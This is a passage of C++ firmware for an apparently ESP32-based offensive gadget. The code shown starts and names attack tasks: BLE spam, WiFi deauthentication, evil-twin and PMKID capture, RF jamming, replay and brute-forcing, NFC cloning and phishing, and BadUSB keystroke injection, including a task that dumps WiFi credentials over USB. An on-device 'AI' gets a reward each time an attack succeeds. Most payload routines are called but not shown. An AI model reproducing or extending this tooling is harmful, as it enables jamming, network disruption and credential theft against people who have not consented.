        vTaskDelete(NULL);
        return;
    }
    
    Serial.println("[USB] USB HID Keyboard mode starting...");
    USBDriver::startKeyboard();
    delay(2000); // Wait for host to recognize
    
    // Execute default payload from SD if exists
    if (AggressiveSD::fileExists("/payloads/badusb_default.txt")) {
        Serial.println("[USB] Executing payload from SD card...");
        USBDriver::executePayloadFromFile("/payloads/badusb_default.txt");
    } else {
        // Demo payload - opens notepad and types message
        Serial.println("[USB] Executing demo payload...");
        const char* demoPayload = R"(
DELAY 2000
GUI r
DELAY 500
STRING notepad
ENTER
DELAY 1000
STRING === MONSTER S3 BADUSB ===
ENTER
STRING This device is compromised!
ENTER
STRING Your security team should investigate.
ENTER
DELAY 500
)";
        USBDriver::executePayload(demoPayload);
    }
    
    // Keep running for continuous payloads
    while (!stop_requested) {
        delay(1000);
        
        // Check for new payload files
        // Could implement command queue here
    }
    
    USBDriver::stopKeyboard();
    vTaskDelete(NULL);
}

// --- USB EXFIL TASK ---
static void task_usb_exfil(void *pvParameters) {
    Serial.println("[ATTACK] Starting USB Exfiltration...");
    
    if (!USBDriver::init()) {
        Serial.println("[USB] Failed to initialize USB HID");
        vTaskDelete(NULL);
        return;
    }
    
    Serial.println("[USB] USB WiFi Credential Exfiltration...");
    USBDriver::startKeyboard();
    delay(2000);
    
    // Execute WiFi credential dump
    Serial.println("[USB] Dumping WiFi credentials...");
    USBDriver::exfilWiFiCredentials();
    
    // Wait for completion
    delay(5000);
    
    // Optional: Also dump browser passwords, etc.
    while (!stop_requested) {
        // Could add more exfil payloads here
        delay(1000);
    }
    
    USBDriver::stopKeyboard();
    vTaskDelete(NULL);
}

// ============================================================================
// MANAGER FUNCTIONS
// ============================================================================

void attacks_init() {
    stop_requested = false;
    current_attack = ATTACK_NONE;
    attack_task_handle = NULL;

    // RF Core disabled - uncomment when CC1101 is connected
    // RFCore::init();
    Serial.println("[ATTACKS] RF disabled - CC1101 not connected");

    log_system("Attacks Manager initialized");
    Serial.println("[ATTACKS] Manager Initialized");
}

void attacks_stop() {
    if (current_attack == ATTACK_NONE) return;

    const char* name = attacks_get_name(current_attack);
    stop_requested = true;
    delay(200);

    // Tasks will auto-delete themselves when stop_requested is true
    // No need to manually delete here to avoid invalid handle crashes

    // Stop any active RF operations
    RFCore::stopJammer();
    RFCore::stopReceive();
    RFCore::stopGhostReplay();
    RFCore::stopBruteForce();
    RFCore::stopFrequencyScan();

    set_module_power(0);
    attack_task_handle = NULL; // Clear handle
    current_attack = ATTACK_NONE;

    // Log and notify
    log_attack(name, true);  // Assume success if stopped manually
    tts_speak("ataque_parado");
    Serial.println("[ATTACKS] Stopped");
}

void attacks_start(AttackType type) {
    if (current_attack == type) return;

    stop_requested = false;
    current_attack = type;

    Serial.printf("[ATTACKS] Starting: %s\n", attacks_get_name(type));

    switch (type) {
        // BLE - each has specific task
        case ATTACK_BLE_SPAM:
            xTaskCreate(task_ble_spam, "Att_BLE", 4096, NULL, 3, &attack_task_handle);
            break;
        case ATTACK_BLE_SOUR_APPLE:
            xTaskCreate(task_ble_sour_apple, "Att_BLE", 4096, NULL, 3, &attack_task_handle);
            break;
        case ATTACK_BLE_SWIFT_PAIR:
            xTaskCreate(task_ble_swift_pair, "Att_BLE", 4096, NULL, 3, &attack_task_handle);
            break;
        case ATTACK_BLE_FAST_PAIR:
            xTaskCreate(task_ble_fast_pair, "Att_BLE", 4096, NULL, 3, &attack_task_handle);
            break;

        // WiFi - individual tasks
        case ATTACK_WIFI_DEAUTH:
            xTaskCreate(task_wifi_deauth, "Att_WiFi", 4096, NULL, 3, &attack_task_handle);
            break;
        case ATTACK_WIFI_BEACON_SPAM:
            xTaskCreate(task_wifi_beacon_spam, "Att_WiFi", 4096, NULL, 3, &attack_task_handle);
            break;
        case ATTACK_WIFI_EVIL_TWIN:
            xTaskCreate(task_wifi_evil_twin, "Att_WiFi", 8192, NULL, 3, &attack_task_handle);
            break;
        case ATTACK_WIFI_PMKID:
            xTaskCreate(task_wifi_pmkid, "Att_WiFi", 4096, NULL, 3, &attack_task_handle);
            break;
        case ATTACK_WIFI_WARDRIVE:
            xTaskCreate(task_wifi_wardrive, "Att_WiFi", 8192, NULL, 3, &attack_task_handle);
            break;

        // RF Jammers
        case ATTACK_RF_JAMMER_433:
            xTaskCreate(task_rf_jammer_433, "Att_RF", 4096, NULL, 5, &attack_task_handle);
            break;
        case ATTACK_RF_JAMMER_315:
            xTaskCreate(task_rf_jammer_315, "Att_RF", 4096, NULL, 5, &attack_task_handle);
            break;
        case ATTACK_RF_JAMMER_868:
            xTaskCreate(task_rf_jammer_868, "Att_RF", 4096, NULL, 5, &attack_task_handle);
            break;
        case ATTACK_RF_JAMMER_BURST:
            xTaskCreate(task_rf_jammer_burst, "Att_RF", 4096, NULL, 5, &attack_task_handle);
            break;
        case ATTACK_RF_JAMMER_SMART:
            xTaskCreate(task_rf_jammer_smart, "Att_RF", 4096, NULL, 5, &attack_task_handle);
            break;

        // RF Capture/Replay
        case ATTACK_RF_CAPTURE:
        case ATTACK_RF_SCAN:
            xTaskCreate(task_rf_capture, "Att_RF", 4096, NULL, 4, &attack_task_handle);
            break;
        case ATTACK_RF_REPLAY:
            xTaskCreate(task_rf_replay, "Att_RF", 4096, NULL, 4, &attack_task_handle);
            break;
        case ATTACK_RF_GHOST_REPLAY:
            xTaskCreate(task_rf_ghost, "Att_RF", 4096, NULL, 4, &attack_task_handle);
            break;

        // RF Brute Force
        case ATTACK_RF_BRUTE_FORCE:
        case ATTACK_RF_DEBRUIJN:
            xTaskCreate(task_rf_brute, "Att_RF", 4096, NULL, 4, &attack_task_handle);
            break;

        // RF Spectrum
        case ATTACK_RF_SPECTRUM:
            xTaskCreate(task_rf_spectrum, "Att_RF", 4096, NULL, 3, &attack_task_handle);
            break;

        // IR
        case ATTACK_IR_TV_OFF:
            xTaskCreate(task_ir_tv_off, "Att_IR", 4096, NULL, 2, &attack_task_handle);
            break;
        case ATTACK_IR_BRUTE:
            xTaskCreate(task_ir_brute, "Att_IR", 4096, NULL, 2, &attack_task_handle);
            break;
        case ATTACK_IR_CLONE:
            xTaskCreate(task_ir_clone, "Att_IR", 4096, NULL, 2, &attack_task_handle);
            break;

        // NFC
        case ATTACK_NFC_CLONE:
            xTaskCreate(task_nfc_clone, "Att_NFC", 4096, NULL, 3, &attack_task_handle);
            break;
        case ATTACK_NFC_FAULT:
            xTaskCreate(task_nfc_fault, "Att_NFC", 4096, NULL, 3, &attack_task_handle);
            break;
        case ATTACK_NFC_PHISHING:
            xTaskCreate(task_nfc_phishing, "Att_NFC", 4096, NULL, 3, &attack_task_handle);
            break;

        // USB
        case ATTACK_USB_BADUSB:
            xTaskCreate(task_usb_badusb, "Att_USB", 4096, NULL, 2, &attack_task_handle);
            break;
        case ATTACK_USB_EXFIL:
            xTaskCreate(task_usb_exfil, "Att_USB", 4096, NULL, 2, &attack_task_handle);
            break;

        default: current_attack = ATTACK_NONE; break;
    }
}

bool attacks_is_running() { return current_attack != ATTACK_NONE; }

AttackType attacks_get_current() { return current_attack; }

void attacks_update() {
    // Called from main loop for time-based updates
    // Most logic is in dedicated tasks now
}

void attacks_report_success() {
    Serial.println("[ATTACKS] Success reported");
    log_attack(attacks_get_name(current_attack), true);
    ai_report_success();  // +1 reward to AI
}

void attacks_report_fail() {
    Serial.println("[ATTACKS] Fail reported");
    log_attack(attacks_get_name(current_attack), false);
    ai_report_failure();  // -1 reward to AI
}

const char *attacks_get_name(AttackType type) {
    switch (type) {
        case ATTACK_NONE: return "None";

        // BLE
        case ATTACK_BLE_SPAM: return "BLE Spam";
        case ATTACK_BLE_SOUR_APPLE: return "Sour Apple";
        case ATTACK_BLE_SWIFT_PAIR: return "Swift Pair";
        case ATTACK_BLE_FAST_PAIR: return "Fast Pair";

        // WiFi
        case ATTACK_WIFI_DEAUTH: return "WiFi Deauth";
        case ATTACK_WIFI_BEACON_SPAM: return "Beacon Spam";
        case ATTACK_WIFI_EVIL_TWIN: return "Evil Twin";
        case ATTACK_WIFI_PMKID: return "PMKID Capture";
        case ATTACK_WIFI_WARDRIVE: return "Wardriving";

        // RF
        case ATTACK_RF_JAMMER_433: return "Jammer 433MHz";
        case ATTACK_RF_JAMMER_315: return "Jammer 315MHz";
        case ATTACK_RF_JAMMER_868: return "Jammer 868MHz";
        case ATTACK_RF_JAMMER_BURST: return "Jammer Burst";
        case ATTACK_RF_JAMMER_SMART: return "Jammer Smart";
        case ATTACK_RF_SCAN: return "RF Scan";
        case ATTACK_RF_CAPTURE: return "RF Capture";
        case ATTACK_RF_REPLAY: return "RF Replay";
        case ATTACK_RF_GHOST_REPLAY: return "Ghost Replay";
        case ATTACK_RF_BRUTE_FORCE: return "RF Brute Force";
        case ATTACK_RF_DEBRUIJN: return "De Bruijn";
        case ATTACK_RF_SPECTRUM: return "Spectrum Analyzer";

        // NFC
        case ATTACK_NFC_CLONE: return "NFC Clone";
        case ATTACK_NFC_FAULT: return "NFC Fault";
        case ATTACK_NFC_PHISHING: return "NFC Phishing";

        // IR
        case ATTACK_IR_BRUTE: return "IR Brute";
        case ATTACK_IR_TV_OFF: return "TV-B-Gone (NEC)";
        case ATTACK_IR_CLONE: return "IR Cloner";

        // USB
        case ATTACK_USB_BADUSB: return "BadUSB";
        case ATTACK_USB_EXFIL: return "USB Exfil";

        default: return "Unknown";
    }
}
